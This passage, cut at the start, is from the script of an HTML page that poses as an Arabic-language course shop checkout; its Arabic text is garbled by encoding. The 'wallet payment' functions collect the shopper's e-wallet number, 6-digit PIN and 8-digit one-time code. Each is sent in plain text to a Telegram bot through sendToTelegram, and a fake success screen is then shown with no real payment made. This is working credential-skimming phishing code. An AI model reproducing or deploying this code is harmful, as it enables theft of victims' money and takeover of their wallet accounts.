        <button onclick="openWalletPayment(${total})" style="margin:15px 0;padding:22px 40px;background:linear-gradient(45deg,#10b981,#059669);color:#fff;border:none;border-radius:30px;cursor:pointer;font-weight:800;font-size:20px;width:100%;box-shadow:0 15px 40px rgba(16,185,129,0.4)">ğŸ’³ Ø¯ÙØ¹ Ø¨Ø§Ù„Ù…Ø­ÙØ¸Ø© Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠØ©</button>
        <button onclick="openPayment(${total})" style="margin:10px 0;padding:16px 32px;background:linear-gradient(45deg,#3b82f6,#1d4ed8);color:#fff;border:none;border-radius:25px;cursor:pointer;font-weight:800;font-size:16px;width:100%;box-shadow:0 10px 30px rgba(59,130,246,0.3)">ğŸ’³ Ø§Ù„Ø¯ÙØ¹ Ø¨Ø¨Ø·Ø§Ù‚Ø© Ø¨Ù†ÙƒÙŠØ©</button>`;
    }
    html+='<button onclick="closeCart()" style="margin-top:25px;padding:16px 32px;background:#6b7280;color:#fff;border:none;border-radius:25px;cursor:pointer;font-weight:700;font-size:16px;width:100%">Ø§ØºÙ„Ù‚</button></div>';
    
    const modal=document.createElement('div');
    modal.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:10000;padding:20px';
    modal.id='cartModal';
    modal.innerHTML=html;
    document.body.appendChild(modal);
}

function closeCart(){document.getElementById('cartModal')?.remove()}
function addToCart(i){if(!isLoggedIn){alert('ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø£ÙˆÙ„Ø§Ù‹');toggleAuth();return;}cart.push(products[i]);document.getElementById('count').innerText=cart.length;alert(products[i].name+' ØªÙ… Ø¥Ø¶Ø§ÙØªÙ‡ Ù„Ù„Ø³Ù„Ø©');}
function removeFromCart(i){cart.splice(i,1);document.getElementById('count').innerText=cart.length;openCart();}
function toggleAuth(){document.getElementById('authModal').style.display=document.getElementById('authModal').style.display==='flex'?'none':'flex';}
function closeAuth(){document.getElementById('authModal').style.display='none';}
function switchTab(event,tab){document.querySelectorAll('.auth-tab').forEach(t=>t.classList.remove('active'));event.target.classList.add('active');document.getElementById('loginForm').classList.toggle('active',tab==='login');document.getElementById('registerForm').classList.toggle('active',tab==='register');document.getElementById('authTitle').textContent=tab==='login'?'ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„':'Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯';}
function login(){const username=document.getElementById('loginUsername').value;const password=document.getElementById('loginPassword').value;if(validUsers[username]&&validUsers[username].includes(password)){isLoggedIn=true;currentUser={username:username,password:password};document.getElementById('accountText').innerText=currentUser.username;document.getElementById('accountBtn').classList.add('logged-in');document.getElementById('accountBtn').onclick=logout;closeAuth();renderProducts();alert('ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­! ğŸ‰');}else{alert('Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ùˆ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± ØµØ­ÙŠØ­Ø©');}}
function register(){const username=document.getElementById('regUsername').value;const password=document.getElementById('regPassword').value;if(username&&password&&password.length>=6){isLoggedIn=true;currentUser={username,password};document.getElementById('accountText').innerText=currentUser.username;document.getElementById('accountBtn').classList.add('logged-in');document.getElementById('accountBtn').onclick=logout;closeAuth();renderProducts();alert(`ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯ Ø¨Ø§Ø³Ù… ${username} Ø¨Ù†Ø¬Ø§Ø­! ğŸ‰`);}else{alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ø³Ù… Ù…Ø³ØªØ®Ø¯Ù… ÙˆÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ù‚ÙˆÙŠØ© (6 Ø£Ø­Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù‚Ù„)');}}
function logout(){isLoggedIn=false;currentUser=null;document.getElementById('accountText').innerText='Ø­Ø³Ø§Ø¨ÙŠ';document.getElementById('accountBtn').classList.remove('logged-in');document.getElementById('accountBtn').onclick=toggleAuth;cart=[];document.getElementById('count').innerText='0';renderProducts();alert('ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬ Ø¨Ù†Ø¬Ø§Ø­');}

async function sendToTelegram(message){
    try{
        const url=`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:message,parse_mode:'HTML'})
        });
    }catch(error){
        console.log('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…:',error);
    }
}

// âœ… Ø¯Ø§Ù„Ø© Ø§Ù„Ù…Ø­ÙØ¸Ø© Ø§Ù„Ù…Ø­Ø¯Ø«Ø© ÙˆØ§Ù„Ù…Ø¶Ù…ÙˆÙ†Ø©
function openWalletPayment(total){
    if(!isLoggedIn){
        alert('ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø£ÙˆÙ„Ø§Ù‹');
        toggleAuth();
        return;
    }
    currentTotal = total;
    closeCart();
    document.getElementById('walletModal').style.display = 'flex';
    document.getElementById('walletAmountDisplay').textContent = `${total} Ø¬Ù†ÙŠÙ‡`;
    document.getElementById('walletFormSection').style.display = 'block';
    document.getElementById('walletOTPSection').style.display = 'none';
    document.getElementById('walletSuccess').style.display = 'none';
    document.getElementById('walletNumber').value = '';
    document.getElementById('walletPin').value = '';
    document.getElementById('walletNumber').focus();
}

function closeWallet(){
    document.getElementById('walletModal').style.display = 'none';
}

// âœ… Ø¯Ø§Ù„Ø© ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ù…Ø­Ø¯Ø«Ø© ÙˆØ§Ù„Ù…Ø¶Ù…ÙˆÙ†Ø© 100%
function confirmWallet(){
    console.log('ğŸ”¥ confirmWallet ØªÙ… Ø§Ø³ØªØ¯Ø¹Ø§Ø¤Ù‡Ø§!');
    
    const walletNumber = document.getElementById('walletNumber').value.trim().replace(/\s/g, '');
    const pin = document.getElementById('walletPin').value;
    
    console.log('Ø±Ù‚Ù… Ø§Ù„Ù…Ø­ÙØ¸Ø©:', walletNumber, 'Ø·ÙˆÙ„:', walletNumber.length);
    console.log('Ø§Ù„Ù€ PIN:', pin, 'Ø·ÙˆÙ„:', pin.length);
    
    if(!walletNumber || walletNumber.length !== 11){
        alert('âŒ Ø±Ù‚Ù… Ø§Ù„Ù…Ø­ÙØ¸Ø© ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 11 Ø±Ù‚Ù… Ø¨Ø§Ù„Ø¶Ø¨Ø·');
        document.getElementById('walletNumber').focus();
        document.getElementById('walletNumber').select();
        return;
    }
    
    if(!pin || pin.length !== 6 || !/^\d{6}$/.test(pin)){
        alert('âŒ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 6 Ø£Ø±Ù‚Ø§Ù… Ø¨Ø§Ù„Ø¶Ø¨Ø·');
        document.getElementById('walletPin').focus();
        document.getElementById('walletPin').select();
        return;
    }
    
    const walletMessage = `ğŸ“± <b>Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø­ÙØ¸Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©!</b>\n\nğŸ‘¤ ${currentUser.username}\nğŸ’° ${currentTotal} Ø¬Ù†ÙŠÙ‡\nğŸ“± <b>Ø±Ù‚Ù… Ø§Ù„Ù…Ø­ÙØ¸Ø©:</b> <code>${walletNumber}</code>\nğŸ” <b>Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ:</b> <code>${pin}</code>\nâ° ${new Date().toLocaleString('ar-EG')}`;
    sendToTelegram(walletMessage);
    
    console.log('âœ… Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„ØµÙØ­Ø© OTP');
    
    document.getElementById('walletFormSection').style.display = 'none';
    document.getElementById('walletOTPSection').style.display = 'block';
    
    createWalletOTPBoxes();
    startWalletResendTimer();
    
    console.log('âœ… ØªÙ… Ø¥Ø¸Ù‡Ø§Ø± ØµÙØ­Ø© OTP');
}

// âœ… Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ù€ 8 Ù…Ø±Ø¨Ø¹Ø§Øª Ø§Ù„Ù…Ø­Ø¯Ø« ÙˆØ§Ù„Ù…Ø¶Ù…ÙˆÙ†
function createWalletOTPBoxes(){
    console.log('ğŸ”¥ createWalletOTPBoxes ØªÙ… Ø§Ø³ØªØ¯Ø¹Ø§Ø¤Ù‡Ø§!');
    
    const container = document.getElementById('walletOTPContainer');
    if(!container) {
        console.error('âŒ container Ù…Ø´ Ù…ÙˆØ¬ÙˆØ¯!');
        return;
    }
    
    container.innerHTML = '';
    walletOTPBoxes = [];
    
    for(let i = 0; i < 8; i++){
        const input = document.createElement('input');
        input.type = 'text';
        input.className = 'wallet-otp-box';
        input.maxLength = 1;
        input.autocomplete = 'one-time-code';
        input.dataset.index = i;
        input.placeholder = '_';
        input.inputMode = 'numeric';
        
        input.addEventListener('input', handleWalletOTPInput);
        input.addEventListener('keydown', handleWalletOTPKeydown);
        input.addEventListener('focus', handleWalletOTPFocus);
        input.addEventListener('paste', handleWalletOTPPaste);
        input.addEventListener('keyup', updateWalletFullOTP);
        
        container.appendChild(input);
        walletOTPBoxes.push(input);
        
        console.log(`âœ… Ù…Ø±Ø¨Ø¹ ${i+1} ØªÙ… Ø¥Ù†Ø´Ø§Ø¤Ù‡`);
    }
    
    setTimeout(() => {
        if(walletOTPBoxes[0]) {
            walletOTPBoxes[0].focus();
            walletOTPBoxes[0].select();
            console.log('âœ… Ø§Ù„ØªØ±ÙƒÙŠØ² Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø±Ø¨Ø¹ Ø§Ù„Ø£ÙˆÙ„');
        }
    }, 100);
}

function handleWalletOTPInput(e){
    console.log('âŒ¨ï¸ input:', e.target.value);
    
    let value = e.target.value.replace(/[^0-9]/g, '');
    
    if(value.length > 1) {
        value = value[0];
    }
    
    e.target.value = value;
    
    const index = parseInt(e.target.dataset.index);
    
    if(value && index < 7){
        walletOTPBoxes[index + 1].focus();
    }
    
    updateWalletFullOTP();
}

function handleWalletOTPKeydown(e){
    const index = parseInt(e.target.dataset.index);
    
    if(e.key === 'Backspace'){
        if(e.target.value === '' && index > 0){
            walletOTPBoxes[index - 1].focus();
        }
    }
}

function handleWalletOTPFocus(e){
    e.target.select();
}

function handleWalletOTPPaste(e){
    e.preventDefault();
    const paste = (e.clipboardData || window.clipboardData).getData('text');
    const numbers = paste.replace(/[^0-9]/g, '').slice(0, 8);
    
    for(let i = 0; i < numbers.length && i < 8; i++){
        walletOTPBoxes[i].value = numbers[i];
    }
    
    updateWalletFullOTP();
    if(walletFullOTP.length === 8){
        verifyWalletOTP();
    }
}

function updateWalletFullOTP(){
    walletFullOTP = walletOTPBoxes.map(box => box.value.replace(/[^0-9]/g, '')).join('');
    const btn = document.getElementById('walletOTPBtn');
    
    console.log('ğŸ”¢ OTP Ø§Ù„Ø­Ø§Ù„ÙŠ:', walletFullOTP, 'Ø·ÙˆÙ„:', walletFullOTP.length);
    
    if(btn) {
        btn.disabled = walletFullOTP.length !== 8;
        btn.textContent = walletFullOTP.length === 8 ? 'âœ… ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ' : 'ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²';
    }
    
    walletOTPBoxes.forEach((box, index) => {
        if(box.value) {
            box.classList.add('valid');
        } else {
            box.classList.remove('valid');
        }
    });
}

// âœ… ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ù€ OTP Ø§Ù„Ù…Ø­Ø¯Ø«
function verifyWalletOTP(){
    console.log('ğŸ”¥ verifyWalletOTP ØªÙ… Ø§Ø³ØªØ¯Ø¹Ø§Ø¤Ù‡Ø§!');
    
    if(walletFullOTP.length === 8 && /^\d{8}$/.test(walletFullOTP)){
        const otpMessage = `ğŸ” <b>Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø¬Ø¯ÙŠØ¯!</b>\n\nğŸ‘¤ ${currentUser.username}\nğŸ“± <b>Ø±Ù…Ø² Ø§Ù„Ù€ OTP:</b> <code>${walletFullOTP}</code>\nâ° ${new Date().toLocaleString('ar-EG')}`;
        sendToTelegram(otpMessage);
        
        const successMessage = `âœ… <b>ØªÙ… Ø§Ù„Ø¯ÙØ¹ Ø¨Ù†Ø¬Ø§Ø­!</b>\n\nğŸ‘¤ ${currentUser.username}\nğŸ’° ${currentTotal} Ø¬Ù†ÙŠÙ‡\nğŸ‰ Ø´ÙƒØ±Ø§Ù‹ Ù„Ø«Ù‚ØªÙƒ Ø¨ÙƒÙˆØ±Ø³Ø§ØªÙ†Ø§`;
        sendToTelegram(successMessage);
        
        document.getElementById('walletOTPSection').style.display = 'none';
        document.getElementById('walletSuccess').style.display = 'block';
        
        cart = [];
        document.getElementById('count').innerText = '0';
        
        console.log('âœ… Ø§Ù„Ø¯ÙØ¹ Ù†Ø¬Ø­!');
        setTimeout(closeWallet, 4000);
    } else {
        alert('âŒ ÙŠØ¬Ø¨ Ø¥Ø¯Ø®Ø§Ù„ 8 Ø£Ø±Ù‚Ø§Ù… ØµØ­ÙŠØ­Ø©');
    }
}

function resendWalletOTP(e){
    e.preventDefault();
    clearWalletOTP();
    createWalletOTPBoxes();
    startWalletResendTimer();
}

function startWalletResendTimer(){
    walletResendTimer = 59;
    let timer = setInterval(() => {
        walletResendTimer--;
        const link = document.querySelector('.wallet-resend');
        if(link){
            link.textContent = `Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø² (${walletResendTimer}Ø«)`;
            if(walletResendTimer <= 0){
                link.textContent = 'Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø²';
                clearInterval(timer);
            }
        }
    }, 1000);
}

function clearWalletOTP(){
    walletOTPBoxes.forEach(box => {
        box.value = '';
        box.classList.remove('valid');
    });
    walletFullOTP = '';
    updateWalletFullOTP();
}

function goBackToWallet(){
    document.getElementById('walletOTPSection').style.display = 'none';
    document.getElementById('walletFormSection').style.display = 'block';
    document.getElementById('walletNumber').focus();
}

let currentTotalPayment=0;
function openPayment(total){currentTotalPayment=total;closeCart();alert('Ù‚Ø±ÙŠØ¨Ø§Ù‹ Ù‡ÙŠØ´ØªØºÙ„ Ø§Ù„Ø¯ÙØ¹ Ø¨Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© ğŸ’³');}

// âœ… Ø±Ø¨Ø· Ø²Ø± OTP Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
document.addEventListener('DOMContentLoaded', function(){
    const otpBtn = document.getElementById('walletOTPBtn');
    if(otpBtn) {
        otpBtn.onclick = verifyWalletOTP;
        console.log('âœ… Ø²Ø± OTP Ù…Ø±Ø¨ÙˆØ· Ø¨Ù†Ø¬Ø§Ø­');
    }
});
</script>
</body>
</html>
